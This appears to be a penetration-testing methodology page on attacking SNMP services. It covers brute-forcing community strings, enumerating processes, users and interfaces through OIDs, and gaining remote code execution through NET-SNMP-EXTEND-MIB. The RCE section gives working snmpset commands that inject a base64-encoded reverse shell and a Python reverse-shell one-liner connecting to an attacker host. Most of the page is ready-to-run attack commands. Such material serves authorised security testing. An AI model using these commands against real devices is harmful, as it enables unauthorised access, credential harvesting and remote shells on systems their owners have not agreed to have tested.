# 161,162,10161,10162/UDP -  SNMP

SNMP - **Simple Network Management Protocol** is a protocol used to monitor different devices on the network (such as routers, switches, printers, IoTs...). SNMP has a lot of **information** about the host and the things you can find interesting are: **Network interfaces** (IPv4 and IPv6 address), **user names**, **uptime**, **server/OS version**, and **running processes** (can contain passwords), etc.

## Theory

{% content-ref url="theory-snmp.md" %}
[theory-snmp.md](theory-snmp.md)
{% endcontent-ref %}

## Methodology

### #1. Bruteforce community strings

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
sudo nmap -sU -p 161 --script "snmp* and not snmp-brute" <IP>
onesixtyone -c <WORDLIST COMMUNITY STRING> <IP> # Wordlist: /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
onesixtyone <IP> <COMMUNITY STRING>
hydra -P /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### #2. Data access (SNMP enumeration)

It is recommended to install the following to see what each OID collected from the device means:

```bash
# Ubuntu/Debian:
apt-get install snmp-mibs-downloader
download-mibs
# Arch Linux:
sudo pacman -S net-snmp
```

{% tabs %}
{% tab title="snmpwalk" %}
```bash
snmpwalk -v <VERSION> -c <COMMUNITY STRING> <IP>
snmpwalk -c <COMMUNITY STRING> -v 1 <IP> <OID>
snmpwalk -c <COMMUNITY STRING> -v 1 <IP> .1 # Enum all
snmpwalk -On -v <VERSION> -c <COMMUNITY STRING> <IP> <OID> # The OID can be 1.3.6 (at the end of the command, it should say "End of MIB").
snmpwalk -On -t 1 -r 1 -v <VERSION> -c <COMMUNITY STRING> <IP> <OID>
```
{% endtab %}

{% tab title="Braa" %}
Braa is a massive SNMP scanner. The intended use of such a tool is, of course, to do SNMP queries - but unlike net-snmp's snmpwalk, it is capable of querying dozens or hundreds of hosts simultaneously, and in a single process. Thus, it consumes very few system resources and makes scanning VERY fast.

Braa implements its own snmp stack, so it does NOT need any SNMP library like net-snmp.

```bash
braa [Community-string]@[IP of SNMP server]:[iso id]
braa public@<IP>:.1.3.6.\*
```
{% endtab %}

{% tab title="snmpbulkwalk" %}
{% hint style="success" %}
Same syntax as **snmpwalk**, but this one is faster.
{% endhint %}
{% endtab %}

{% tab title="snmp-check" %}
Like snmpwalk, **snmp-check** allows you to enumerate SNMP devices and puts the output in a very readable friendly format. It can be useful for penetration testing or system monitoring.

### Installation

{% hint style="success" %}
If you are using Kali Linux, it is not necessary to install it as it is included by default.
{% endhint %}

```bash
wget https://gitlab.com/kalilinux/packages/snmpcheck/-/raw/kali/master/snmpcheck-1.9.rb
```

{% embed url="https://gitlab.com/kalilinux/packages/snmpcheck/-/tree/kali/master" %}
Download link
{% endembed %}

### Use

```bash
ruby snmpcheck-1.9.rb <IP> -c <COMMUNITY STRING>
ruby snmpcheck-1.9.rb <IP> -v <VERSION> -c <COMMUNITY STRING>
```
{% endtab %}
{% endtabs %}

## Interesting OIDs

|            dot OID           |       Node Name      |                                    Description                                   |
| :--------------------------: | :------------------: | :------------------------------------------------------------------------------: |
|     1.3.6.1.2.1.25.4.2.1     |     hrSWRunEntry     |                              Running system process                              |
|     1.3.6.1.2.1.25.1.6.0     |   hrSystemProcesses  |                                 System Processes                                 |
|         1.3.6.1.2.1.2        | interface/interfaces | Interfaces ([nmap script](https://nmap.org/nsedoc/scripts/snmp-interfaces.html)) |
|      1.3.6.1.2.1.4.34.1      |    ipAddressEntry    |                  An address mapping for a particular interface.                  |
|     1.3.6.1.4.1.77.1.2.25    |      svUserTable     |                 The table of active user accounts on this server.                |
|     1.3.6.1.2.1.25.6.3.1     |  hrSWInstalledEntry  |       A (conceptual) entry for a piece of software installed on this host.       |
| 1.3.6.1.4.1.8072.1.3.2.2.1.2 |    nsExtendCommand   |              The full path of the command binary (or script) to run.             |

#### Examples

```bash
snmpwalk -v <VERSION> -c <COMMUNITY STRING> <IP> <dot_OID>
snmpwalk -v <VERSION> -c <COMMUNITY STRING> <IP> <NODE_NAME>
```

#### nsExtendCommand (Command execution)

Depending on who is executing the command and what type of command, we can abuse them. Enumeration:

```bash
snmpwalk -v <VERSION> -c <COMMUNITY STRING> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -v <VERSION> -c <COMMUNITY STRING> <IP> nsExtendCommand
```

## Known IPv6 address

{% tabs %}
{% tab title="Method #1" %}
```bash
snmpwalk -c <COMMUNITY STRING> -v <VERSION> <IP> ipAddressIfIndex.ipv6 | cut -d '"' -f 2 | grep "de:ad" | sed -E 's/(.{2}):(.{2})/\1\2/g'
echo "<IPV6>" | sed -E 's/(.{2}):(.{2})/\1\2/g'
```
{% endtab %}

{% tab title="Method #2" %}
Get MAC → Run script to get the IPV6 (only from the host side, i.e., the EUI-64) → Add IPv6 prefix.

```bash
# Dependencies (ipv6calc):
sudo pacman -S ipv6calc # Ubuntu/Debian
sudo apt-get install ipv6calc # Arch Linux
```

```bash
#!/bin/bash

sudo nmap --script snmp-interfaces -p 161 -sU 10.10.10.20 > snmp_interfaces.txt
echo $(cat snmp_interfaces.txt | grep MAC | cut -d " " -f 8 | ipv6calc --mac_to_eui64)
```
{% endtab %}
{% endtabs %}

## SNMP RCE

You can achieve remote code execution in snmpd only if:

* You have access to a **community string** read-write (RW).
* NET-SNMP-EXTEND-MIB is loaded.

{% hint style="danger" %}
There are two configuration directives, usually in **/etc/snmp/snmpd.conf**, called **rocommunity** and **rwcommunity**. Remember: **rwcommunity** specifies the **read-write** community string and **rocommunity** specifies the **read-only** community string.
{% endhint %}

{% tabs %}
{% tab title="Test" %}
The first thing we have to do is to inject a command in an additional row to the "**nsExtendObjects**" table:

```bash
# General syntax:
snmpset -m +NET-SNMP-EXTEND-MIB -v <VERSION> -c <COMMUNITY STRING> <IP> 'nsExtendStatus."evilcommand1"' = createAndGo 'nsExtendCommand."evilcommand1"' = <BINARY PATH> 'nsExtendArgs."evilcommand1"' = '<ARGUMENTS>'
# Example:
snmpset -m +NET-SNMP-EXTEND-MIB -v <VERSION> -c <COMMUNITY STRING> <IP> 'nsExtendStatus."evilcommand1"' = createAndGo 'nsExtendCommand."evilcommand1"' = /bin/echo 'nsExtendArgs."evilcommand1"' = 'hello world'
```

To activate the injected command, we can do it with `snmpwalk`:

```bash
snmpwalk -v <VERSION> -c <COMMUNITY STRING> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
```
{% endtab %}

{% tab title="Reverse Shell" %}
```bash
# Example:
snmpset -m +NET-SNMP-EXTEND-MIB -v <VERSION> -c <COMMUNITY STRING> <IP> 'nsExtendStatus."evilcommand"' = destroy > /dev/null
echo "<REVERSE SHELL>" | base64
snmpset -m +NET-SNMP-EXTEND-MIB -v <VERSION> -c <COMMUNITY STRING> <IP> 'nsExtendStatus."evilcommand"'  = createAndGo 'nsExtendCommand."evilcommand"' = /bin/bash 'nsExtendArgs."evilcommand"' = "-c \\\"echo <REVERSE SHELL ENCODED> | base64 -d | sh\\\"" > /dev/null

# Another example:
snmpset -m +NET-SNMP-EXTEND-MIB -v <VERSION> -c <COMMUNITY STRING> <IP> 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'

# Activate:
snmpwalk -v <VERSION> -c <COMMUNITY STRING> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
```
{% endtab %}

{% tab title="SNMP Shell" %}
```bash
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt

rlwrap python3 shell.py <IP> -c <COMMUNITY STRING>
```
{% endtab %}
{% endtabs %}

## Examine SNMP Configuration files

```bash
snmp.conf
snmpd.conf
snmp-config.xml
```

## References

{% embed url="https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e" %}

{% embed url="https://vulp3cula.gitbook.io/hackers-grimoire/recon/active-information-gathering#snmp" %}

{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-snmp" %}

{% embed url="https://gist.github.com/KhitMinnyo/3df53e571f21efe54a2c734521dd0786" %}
